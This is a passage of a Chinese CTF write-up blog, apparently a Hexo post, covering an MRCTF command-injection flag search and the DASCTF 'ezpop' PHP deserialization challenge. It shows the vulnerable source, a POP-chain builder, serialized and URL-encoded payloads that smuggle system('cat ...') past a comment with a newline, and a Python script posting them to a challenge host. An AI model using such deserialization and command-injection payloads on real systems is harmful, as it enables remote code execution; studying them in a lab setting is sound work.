+<p>比对一下会发现肯定是使用了 <code>system()</code> 函数，并且一般来说不会出现索引 <code>c</code> ，所以大胆猜测 <code>c</code> 就是key。<br>先尝试GET方法，键入 <code>?c=ls</code> 成功回显，发现里面都是一堆重命名过的长数字名称文件，只有最底下有几个常用名文件，于是直接用语句搜索flag：<code>grep+-r+-e+%22MRCTF%22+/var/</code> 。这里加号代替空格，在特定情况下可以避开空格过滤，<code>-e</code> 表示将pattern作为扩展的正则表达式（ERE），<code>-r</code> 表示递归读取目录下的所有文件，<code>/var/</code> 指定搜索目录，由于flag格式中带有”MRCTF”，故可以搜索出flag的位置与内容，最后得到回显：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">var</span>/log/dpkg.log:MRCTF&#123;<span class="number">3</span>f1d6ea4-d544-<span class="number">46</span>f8-ba7c-cfcd0efa31ae&#125; /<span class="keyword">var</span>/www/html/aa700906a6de01cdac6b13a65988f074/index.php：</span><br></pre></td></tr></table></figure></div>
+
+<p>大功告成（指抄作业签到）</p>
+<p><strong>参考：[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43772810/article/details/112059321" >小辉_super-Grep用法 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h1 id="DASCTF"><a href="#DASCTF" class="headerlink" title="DASCTF"></a>DASCTF</h1><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/89/challenges" >DASCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>WP参考:[</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ek1ng.com/2022/03/26/DASCTF/" >ek1ng <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42880719/article/details/123763744" >是Mumuzi <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://www.snowywar.top/?p=2994" >魔法少女雪殇 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong>]</strong></p>
+<h2 id="WEB-1"><a href="#WEB-1" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p>看起来ez了，但不完全ez&#x3D; &#x3D;</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;	</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)	#当该对象被当做函数处理时调用该函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)	#析构函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)	</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();	<span class="comment">#取f1的值并当做函数调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)	#当调用该对象不存在的函数时调用该函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)	#当该对象被当做字符串处理时调用该函数</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;	<span class="comment">#php中的`eval()`函数把字符串按照 PHP 代码来计算，且必须以分号结尾</span></span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);	<span class="comment">#&#x27;#&#x27;为注释符，会导致后面连接的字符串无效化，但是可以用换行符绕过</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;	<span class="comment">#isset()判定变量是否被定义，是否值为空，任一一个满足都返回false</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);	<span class="comment">#反序列化</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;	</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);	<span class="comment">#额文件包含？总之返回了高亮的源码页面</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这是一道反序列化题目，思路是构造一个对象，通过调用彼此的函数（打造一个pop链）最终调用到<code>eval()</code>函数实现任意命令执行。</p>
+<p>用如下代码测试:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ak1</span>=<span class="keyword">new</span> fin;</span><br><span class="line"><span class="variable">$ak2</span>=<span class="keyword">new</span> what;</span><br><span class="line"><span class="variable">$ak3</span>=<span class="keyword">new</span> fin;</span><br><span class="line"><span class="variable">$ak4</span>=<span class="keyword">new</span> crow;</span><br><span class="line"><span class="variable">$ak5</span>=<span class="keyword">new</span> fin;</span><br><span class="line"><span class="variable">$ak6</span>=<span class="keyword">new</span> mix;</span><br><span class="line"><span class="variable">$ak6</span>-&gt;m1=<span class="string">&quot;\nsystem(&#x27;cat flag.php&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$ak1</span>-&gt;f1=<span class="variable">$ak2</span>;</span><br><span class="line"><span class="variable">$ak2</span>-&gt;a=<span class="variable">$ak3</span>;</span><br><span class="line"><span class="variable">$ak3</span>-&gt;f1=<span class="variable">$ak4</span>;</span><br><span class="line"><span class="variable">$ak4</span>-&gt;v1=<span class="variable">$ak5</span>;</span><br><span class="line"><span class="variable">$ak5</span>-&gt;f1=<span class="variable">$ak6</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$ak1</span>);	<span class="comment">#提供序列化内容，注意换行符是经过转义的，所以会自动换行，复制时记得加回去。</span></span><br></pre></td></tr></table></figure></div>
+
+<p>函数层层调用下来到mix的<code>eval()</code>函数，在m1中先用<code>\n</code>绕过注释符号<code>#</code>，因为它首先是个字符串，先执行换行，那么注释的那一行就是空的，代码跑到了下一行。通过任意命令执行找到flag所在的文件，读取即可。这里最后会报错，因为mix不可被转化为字符串，但是报错之前的函数调用都是有效的，所以报错并没有什么关系。</p>
+<p>同时这里<code>m1</code>的值也有所讲究，首先<code>system()</code>括号内命令无论有无空格都最好加引号，其次为了避免引号自闭需要同时使用单双引号，而php中的单双引号有一些细节上的不同:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://img2022.cnblogs.com/blog/2724756/202205/2724756-20220526165327821-644099417.png"
+                     
+                ></p>
+<p>为什么会提到转义呢，因为这个POST请求需要发一个<code>\n</code>，而hackbar和bp都发不上去，最后被迫写了一个python脚本才得以发上去:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9ea3e47b-0c20-42cd-b19b-b0ccb2ce1c07.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&#x27;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;what&quot;:1:&#123;s:1:&quot;a&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:4:&quot;crow&quot;:2:&#123;s:2:&quot;v1&quot;;O:3:&quot;fin&quot;:1:&#123;s:2:&quot;f1&quot;;O:3:&quot;mix&quot;:1:&#123;s:2:&quot;m1&quot;;s:29:&quot;\nsystem(\&#x27;cat H0mvz850F.php\&#x27;);&quot;;&#125;&#125;s:2:&quot;v2&quot;;N;&#125;&#125;&#125;&#125;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url = url,data =data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure></div>
+
+<p>为了避免引号自闭，这里必须转义，所以在写php代码时也就写了转义进行测试，发现单双引号一些很神奇的效果</p>
+<p>当<code>&gt;m1=&#39;\nsystem(\&quot;cat flag.php\&quot;);&#39;</code>时得到的回显：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">27</span>:<span class="string">&quot;\nsystem(\&quot;cat flag.php\&quot;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;hello114514</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Error</span>: Object of <span class="class"><span class="keyword">class</span> <span class="title">crow</span> <span class="title">could</span> <span class="title">not</span> <span class="title">be</span> <span class="title">converted</span> <span class="title">to</span> <span class="title">string</span> <span class="title">in</span> /<span class="title">box</span>/<span class="title">script</span>.<span class="title">php</span>:24</span></span><br><span class="line"><span class="class"><span class="title">Stack</span> <span class="title">trace</span>:</span></span><br><span class="line"><span class="class">#0 [<span class="title">internal</span> <span class="title">function</span>]: <span class="title">fin</span>-&gt;<span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">#1 </span>&#123;main&#125;</span><br><span class="line">  thrown in /box/script.php on line <span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exited with error status <span class="number">255</span></span><br></pre></td></tr></table></figure></div>
+
+<p>当<code>m1=&quot;\nsystem(\&#39;cat flag.php\&#39;);&quot;</code>时得到的回显:	<code>&lt;?-1</code></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">26</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">system(\&#x27;cat flag.php\&#x27;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;</span><br><span class="line">Parse error: syntax error, unexpected <span class="string">&#x27;&#x27;</span>cat flag.php\<span class="string">&#x27;);&#x27;</span> (T_ENCAPSED_AND_WHITESPACE), expecting <span class="title function_ invoke__">identifier</span> (T_STRING) in /box/script.<span class="title function_ invoke__">php</span>(<span class="number">60</span>) : <span class="keyword">eval</span>()<span class="string">&#x27;d code on line 2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Fatal error: Exception thrown without a stack frame in Unknown on line 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Exited with error status 255</span></span><br></pre></td></tr></table></figure></div>
+
+<p>会看到单引号的转义报错了，而双引号没有，这是因为单引号中的双引号被转义失败了（见上文说明），所以在执行的内容是<code>system(\&#39;cat flag\&#39;)</code>…等下等下，是不是反了…双引号才是不能被转义的那个，照这么说的话，是因为转义失败了所以执行成功了？但语句<code>m1=&quot;\nsystem(&#39;cat flag&#39;)&quot;</code>是有效的啊&#x3D; &#x3D;，还是说是参考文章讲错了，说反了？这里还能看到序列化的结果中，换行符被转义的效果也不一样，更奇怪的是语句<code>m1=&quot;\nsystem(&#39;cat flag&#39;)&quot;</code>的返回:</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">system(&#x27;cat flag.php&#x27;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;hello114514</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Error</span>: Object of <span class="class"><span class="keyword">class</span> <span class="title">crow</span> <span class="title">could</span> <span class="title">not</span> <span class="title">be</span> <span class="title">converted</span> <span class="title">to</span> <span class="title">string</span> <span class="title">in</span> /<span class="title">box</span>/<span class="title">script</span>.<span class="title">php</span>:24</span></span><br><span class="line"><span class="class"><span class="title">Stack</span> <span class="title">trace</span>:</span></span><br><span class="line"><span class="class">#0 [<span class="title">internal</span> <span class="title">function</span>]: <span class="title">fin</span>-&gt;<span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">#1 </span>&#123;main&#125;</span><br><span class="line">  thrown in /box/script.php on line <span class="number">24</span></span><br><span class="line"></span><br><span class="line">cat: flag.php: No such file <span class="keyword">or</span> directory</span><br><span class="line"></span><br><span class="line">Exited with error status <span class="number">255</span></span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到换行符被转义了，但结果也输出了，也没有额外的报错。</p>
+<p>假设序列化显示的内容是实际被php读取的内容，那这里说明了双引号内的换行符确实会被转义，而单引号内的不会，这说明参考文章说的是对的。再次测试语句:<code>m1=&#39;\nsystem(\&quot;echo 111\&quot;);&#39;</code></p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">21</span>:<span class="string">&quot;\nsystem(\&quot;echo 1\&quot;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;hello114514</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Error</span>: Object of <span class="class"><span class="keyword">class</span> <span class="title">crow</span> <span class="title">could</span> <span class="title">not</span> <span class="title">be</span> <span class="title">converted</span> <span class="title">to</span> <span class="title">string</span> <span class="title">in</span> /<span class="title">box</span>/<span class="title">script</span>.<span class="title">php</span>:24</span></span><br><span class="line"><span class="class"><span class="title">Stack</span> <span class="title">trace</span>:</span></span><br><span class="line"><span class="class">#0 [<span class="title">internal</span> <span class="title">function</span>]: <span class="title">fin</span>-&gt;<span class="title">__destruct</span>()</span></span><br><span class="line"><span class="class">#1 </span>&#123;main&#125;</span><br><span class="line">  thrown in /box/script.php on line <span class="number">24</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exited with error status <span class="number">255</span></span><br></pre></td></tr></table></figure></div>
+
+<p>这回没错了，由于测试环境本就没有flag，<code>cat flag</code>命令有无执行是看不出来的&#x3D; &#x3D;，只能看报错，这里说明了单引号里的转义确实不成功，但不知道为什么不报错。而被转义成功的单引号反而报错了，并且测试了一下确实没有执行相关语句！所以最后的问题就是<code>&lt;?-1</code>处的代码为什么报错！</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;</span></span><br><span class="line"><span class="string">system(&#x27;cat+*&#x27;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;</span><br><span class="line">ek1ng的原payload</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd=O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;what&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;crow&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;v1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;fin&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;f1&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;mix&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;m1&quot;</span>;s:<span class="number">24</span>:<span class="string">&quot;\nsystem(&#x27;cat flag.php&#x27;);&quot;</span>;&#125;&#125;s:<span class="number">2</span>:<span class="string">&quot;v2&quot;</span>;N;&#125;&#125;&#125;&#125;</span><br><span class="line">我的原payload</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A24%3A%22%5Cnsystem%28%27cat%20flag.php%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</span><br><span class="line">我的url转码</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A17%3A%22%0Asystem%28%27cat+%2A%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7D</span><br><span class="line">ek1ng的url转码</span><br></pre></td></tr></table></figure></div>
+
+<p>对比了ek1ng的payload后我弄清了为什么我的bp打不通。首先发送的payload一定要经过url编码，其次换行符在编码时不能以转义的形式<code>\n</code>用于编码，否则结果会变成<code>%5Cn</code>，而一定要直接打出换行充当换行符，这样编码时就会替换成<code>%0A</code>，是真正的换行符url编码结果。从另一个角度来说，直接发送<code>\n</code>到后台是没有效果的。</p>
+<p><strong>参考:[</strong></p>
